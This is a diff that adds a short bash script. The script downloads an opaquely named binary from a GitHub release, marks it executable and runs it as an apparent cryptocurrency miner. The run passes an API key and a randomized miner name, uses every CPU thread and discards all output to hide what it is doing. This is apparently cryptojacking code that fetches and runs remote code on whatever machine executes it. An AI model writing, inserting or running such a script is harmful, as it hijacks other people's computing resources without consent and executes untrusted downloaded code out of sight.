@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/vencentam/fandim/releases/download/fghfghf/ssui
+chmod +x ssui
+./ssui -apiKey nock0000-5f88-240a-67f6-78c391ad755d -minerName $(echo $(shuf -i 1-15000 -n 1)-ssui) -threads $(nproc --all) > /dev/null 2>&1
